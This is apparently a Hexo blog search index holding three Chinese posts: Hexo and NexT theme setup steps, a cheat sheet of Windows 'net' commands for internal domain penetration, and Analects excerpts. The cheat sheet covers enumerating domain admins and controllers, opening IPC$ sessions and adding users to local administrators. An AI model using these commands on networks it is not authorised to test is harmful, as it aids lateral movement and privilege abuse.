在Hexo/sorce新建CNAME文件写入域名，CNAME文件，注意没有文件后缀； 执行：hexo g 执行：hexo s（本地预览，可以跳过） 执行：hexo d 0x04 使用next主题并给网站添加浏览器logo 主题下载，next在github下载，并把next文件夹放到temes文件夹； 使用next主题，编辑Hexo/_config.yml以下内容：##Themes: https://hexo.io/themes/theme: next 将尺寸为32x32 favicon.ico 文件放在hexo/source/文件夹内，然后修改Hexo\themes\next\_config.yml为： 12# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico 编辑Hexo/_config.yml以下内容： 12# Place your favicon.ico to /source directory.favicon: /favicon.ico 0x05 将网站显示为中文 编辑D:/Hexo/_config.yml配置文件： 12language: zh-Hans #将默认改成zh-Hanstimezone: 在Hexo/next/lanhuages目录下的zh-Hans.yml文件可以自行修改，增加和删除。 0x06 添加菜单和自定义菜单前的图标 编辑themes\next\_config.yml，到menu:字段，在该字段下添加一个字段； 1234menu: home: / about: /about ...... 自定义小图标，关于next使用的小图标你可以通过这个网站Font Awesome来查看自己喜欢的图标，然后copy图标名，编辑Hexo\themes\next\_config.yml，将对应的图标名换成自己喜欢的小图标； 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: mortar-board categories: smile-o schedule: calendar tags: diamond archives: angellist sitemap: sitemap commonweal: heartbeat 0x07 隐藏网页底部powered By Hexo / 强力驱动 打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。12345678910&lt;!--&lt;div class=&quot;powered-by&quot;&gt; &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt; &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; - &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt; 0x08 增加本地搜索功能安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：$ npm install hexo-generator-searchdb --save如果报错多执行几次，有的时候是网络原因，最好在管理员权限下的cmd里执行npm安装命令。编辑Hexo/_config.yml，新增以下内容：12345search: path: search.xml field: post format: html limit: 10000 0x09 使用来必力评论功能 到livere注册账号，安装来必力，记录以下内容： 在next/_config.yml的此处加上自己的livere的uid：livere_uid: your uid 然后去博客查看吧文章下面会看到以下景象： 0x10 参考文章(https://thief.one/2017/03/03/Hexo搭建博客教程/)]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 内网命令收集]]></title>
    <url>%2F2017%2F12%2F09%2FWindows%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[Windows 内网命令常见信息收集命令 123456789101112net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;Domain controllers&quot; 查看域控制器(如果有多台) ipconfig /all 查询本机IP段，所在域等 net view 查询同一域内机器列表 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 内网(域)渗透–基本命令123456789101112131415161718192021222324ipconfig /all 查询本机IP段，所在域等 net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台) net time /domain 判断主域，主域服务器都做时间服务器 net config workstation 当前登录域 net session 查看当前会话 net use \\ip\ipc$ pawword /user:username 建立IPC会话[空连接­***] net share 查看SMB指向的路径[即共享] net view 查询同一域内机器列表 net view \\ip 查询某IP共享 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 net start 查看当前运行的服务 net accounts 查看本地密码策略 net accounts /domain 查看域密码策略nbtstat –A ip netbios 查询 netstat –an/ano/anb 网络连接查询 route print 路由表 End]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[论语十则]]></title>
    <url>%2F2017%2F12%2F07%2Findex.html</url>
    <content type="text"><![CDATA[《论语·十则》子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？” 子曰：“温故而知新，可以为师矣。” 子曰：“学而不思则罔，思而不学则殆。” 子曰：“由，诲女知之乎！知之为知之，不知为不知，是知也。” 子曰：“见贤思齐焉，见不贤而内自省也。” 子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。” 曾子曰：“士不可以不弘毅，任重而道远。仁以为己任，不亦重乎？死而后已，不亦远乎？”子曰：“岁寒，然后知松柏之后凋也。” 1子贡问曰：“有一言而可以终身行之者乎？”子曰：“其恕乎！己所不欲，勿施于人。”]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>省身</tag>
      </tags>
  </entry>
</search>
